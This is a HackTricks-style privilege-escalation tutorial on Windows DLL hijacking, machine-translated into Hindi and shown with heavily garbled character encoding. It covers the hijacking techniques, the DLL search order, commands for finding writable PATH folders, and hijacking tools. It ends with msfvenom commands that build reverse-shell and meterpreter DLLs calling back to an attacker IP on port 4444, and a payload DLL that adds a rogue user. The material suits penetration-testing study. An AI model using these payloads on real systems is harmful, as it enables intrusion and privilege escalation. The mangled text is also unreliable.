# Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдЕрдЧрд░ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рдирд┐рдпреБрдХреНрддрд┐ рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрдиреЗ рдФрд░ рдмреЛрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ_).

{% embed url="https://www.stmcyber.com/careers" %}

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рдордирд┐рдкреБрд░рдг рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рд╢рдмреНрдж рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ **DLL рд╕реНрдкреВрдлрд┐рдВрдЧ, рдЗрдВрдЬреЗрдХреНрд╢рди, рдФрд░ рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ**ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди, рд╕реНрдерд┐рд░рддрд╛ рдкреНрд░рд╛рдкреНрддрд┐ рдФрд░, рдХрдо рд╣реЛрддреЗ рд╣реБрдП, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдВ рдЙрдиреНрдирддрд┐ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд╛ рддрд░реАрдХрд╛ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рдЕрд╡рд┐рд░рд▓ рд░рд╣рддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХреЗрдВ

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдХреА рдкреНрд░рднрд╛рд╡рдХрд╛рд░рд┐рддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ DLL рд▓реЛрдбрд┐рдВрдЧ рд░рдгрдиреАрддрд┐ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ:

1. **DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕реЗ рдмрджрд▓рдирд╛, рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ DLL рдкреНрд░реЙрдХреНрд╕реАрдЗрдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореВрд▓ DLL рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
2. **DLL рдЦреЛрдЬ рдХреНрд░рдо рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдХ рдХреЗ рдЖрдЧреЗ рдПрдХ рдЦреЛрдЬ рдкрде рдореЗрдВ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдЦреЛрдЬ рдкреИрдЯрд░реНрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ред
3. **рдлреИрдВрдЯрдо DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдмрдирд╛рдирд╛ рдЬрд┐рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рдХрд░реЗрдЧрд╛, рд╕реЛрдЪрддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡ рдирд╣реАрдВ рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдЖрд╡рд╢реНрдпрдХ DLL рд╣реИред
4. **DLL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди**: `%PATH%` рдпрд╛ `.exe.manifest` / `.exe.local` рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреИрд╕реЗ рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдкрд░ рдорд╛рд░реНрдЧрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ред
5. **WinSxS DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: WinSxS рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕рдВрдмрдВрдзрд┐рдд рд╡рд┐рдХрд▓реНрдк рд╕реЗ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛, рдПрдХ рд╡рд┐рдзрд┐ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ DLL рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред
6. **рд╕рд╛рдкреЗрдХреНрд╖ рдкрде DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдЙрдкрдпреЛрдХреНрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдХреЙрдкреА рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде, рдмрд╛рдЗрдирд░реА рдкреНрд░реЙрдХреНрд╕реА рдирд┐рд╖реНрдкрд╛рджрди рддрдХрдиреАрдХреЛрдВ рдХреА рддрд░рд╣ред


## рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдирд╛

рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) рдХреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдЪрд▓рд╛рдирд╛ рд╣реИ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 2 рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

рдФрд░ рдмрд╕ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдЧрддрд┐рд╡рд┐рдзрд┐** рджрд┐рдЦрд╛рдирд╛:

![](<../../.gitbook/assets/image (314).png>)

рдпрджрд┐ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рдореЗрдВ рдЧрд╛рдпрдм dlls рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рд╕реЗрдХрдВрдб рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЪрд▓рдиреЗ рджреЗрдВ**ред\
рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ executable рдореЗрдВ рдЧрд╛рдпрдм dll рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **"рдкреНрд░реЛрд╕реЗрд╕ рдирд╛рдо" "рд╢рд╛рдорд┐рд▓ рд╣реИ" "<exec рдирд╛рдо>" рдЬреИрд╕рд╛ рдПрдХ рдФрд░ рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдЪрд▓рд╛рдирд╛ рдФрд░ рдШрдЯрдирд╛рдУрдВ рдХреЛ рд░реЛрдХрдирд╛**ред

## рдЧрд╛рдпрдм Dlls рдХрд╛ рд╢реЛрд╖рдг

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдореМрдХрд╛ рд╣реИ рдХрд┐ **рд╣рдо рдПрдХ dll рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧреА** рдХрд┐рд╕реА **рдРрд╕реЗ рд╕реНрдерд╛рди рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗрдВ** рдЬрд╣рд╛рдВ рдпрд╣ **рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рд╣рдореЗрдВ **рдПрдХ** рдРрд╕реЗ **рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ dll рд▓рд┐рдЦрдиреЗ рдХреА рд╕реНрд╡рддрдВрддреНрд░рддрд╛ рд╣реЛрдЧреА** рдЬрд╣рд╛рдВ **рдореВрд▓ dll рд╕реЗ рдкрд╣рд▓реЗ рдЦреЛрдЬреА рдЬрд╛рдПрдЧреА** (рдЕрдЬреАрдм рдорд╛рдорд▓рд╛), рдпрд╛ рд╣рдореЗрдВ **рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рд╕реНрд╡рддрдВрддреНрд░рддрд╛ рд╣реЛрдЧреА** рдЬрд╣рд╛рдВ dll рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреА рдФрд░ рдореВрд▓ **dll рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**ред

### Dll рдЦреЛрдЬ рдХреНрд░рдо

**рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реА** [**рдореЗрдВ**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **рдЖрдк рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреИрд╕реЗ Dlls рд▓реЛрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдпрд╣рд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред**

**Windows рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреНрд░рдорд╛рдиреБрд╕рд╛рд░ рдПрдХ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде DLLs рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реИрдВред DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреА рд╕рдорд╕реНрдпрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DLL рдЗрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рд░рдгрдиреАрддрд┐рдХ рд░реВрдк рд╕реЗ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдореВрд▓ DLL рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡рд╣ рдЙрд╕ DLL рдХреЛ рдЬрд┐рд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреЗ рд╕рдордп рдкреВрд░реНрдг рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдЖрдк **32-рдмрд┐рдЯ рдкрд░** DLL рдЦреЛрдЬ рдХреНрд░рдо рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬрд┐рд╕рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
2. рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред(_C:\Windows\System32_)
3. 16-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред (_C:\Windows\System_)
4. Windows рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
1. (_C:\Windows_)
5. рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
6. PATH рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░рдг
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
рдФрд░ **рдкрде рдХреЗ рд╕рднреА рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЖрдк рдПрдХ executable рдХреЗ imports рдФрд░ рдПрдХ dll рдХреЗ exports рдХреА рдЬрд╛рдБрдЪ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП **Dll Hijacking рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ **рд╕рд┐рд╕реНрдЯрдо рдкрде рдлрд╝реЛрд▓реНрдбрд░** рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рд┐рд╕реНрдЯрдо PATH рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓реЗрдЦрди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред\
рдЗрд╕ рд╡рдВрд╢рдиреАрдпрддрд╛ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИрдВ **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ рдФрд░ _Write-HijackDll._

### рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдк рдПрдХ рдЙрддреНрдкрд╛рджрдиреАрдп рд╕реНрдерд┐рддрд┐ рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдЗрд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЙрддреНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЪреАрдЬреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛрдЧрд╛ **рдПрдХ dll рдмрдирд╛рдирд╛ рдЬреЛ рдХрдо рд╕реЗ рдХрдо рд╕рднреА рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдЗрд╕рд╕реЗ рдЖрдпрд╛рдд рдХрд░реЗрдЧрд╛**ред рдлрд┐рд░ рднреА, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Dll Hijacking рдордзреНрдпрдо рдЕрднрд┐рдЧрддрд┐ рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ **(UAC рдХреЛ рдЫрд▓рдХрд░)** рдореЗрдВ рд╕реЗ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИ рдпрд╛ **рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдЙрдЪреНрдЪ рдЕрднрд┐рдЧрддрд┐ рд╕реЗ**](./#from-high-integrity-to-system)**ред** рдЖрдк рдПрдХ рдорд╛рдиреНрдп dll рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдЕрдзреНрдпрдпрди рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИ dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**ред**\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **рдЕрдЧрд▓реЗ рдЦрдВрдб** рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ **рдореВрд▓ dll рдХреЛрдб** рдорд┐рд▓реЗрдЧрд╛ рдЬреЛ **рдирдореВрдиреЗ** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **рдПрдХ dll рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬрд┐рд╕рдореЗрдВ **рдЕрдирд╛рд╡рд╢реНрдпрдХ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдП рдЧрдП рд╣реЛрдВ**ред

## **Dlls рдмрдирд╛рдирд╛ рдФрд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛**

### **Dll Proxifying**

рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **Dll рдкреНрд░реЙрдХреНрд╕реА** рдПрдХ Dll рд╣реИ рдЬреЛ **рдЬрдм рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЖрдкрдХреЗ рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ** рд▓реЗрдХрд┐рди рдпрд╣ рднреА **рдЙрд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИ** рдЬреИрд╕реЗ рдХрд┐ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╕рднреА рдХреЙрд▓ рдХреЛ рд░реАрд▓ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдХреЗ**ред

рдЙрдкрдХрд░рдг [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) рдпрд╛ [**Spartacus**](https://github.com/Accenture/Spartacus) рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдкреНрд░реЙрдХреНрд╕реАрдлрд╝рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдФрд░ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЙрдХреНрд╕реАрдлрд╝рд╛рдИрдб dll рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **Dll рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░реЗрдВ** рдФрд░ **рдкреНрд░реЙрдХреНрд╕реАрдлрд╝рд╛рдИрдб dll рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### **Meterpreter**

**рдЧреЗрдЯ рд░реЗрд╡ рд╢реИрд▓ (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ (x86 рдореИрдВрдиреЗ x64 рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рджреЗрдЦрд╛):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
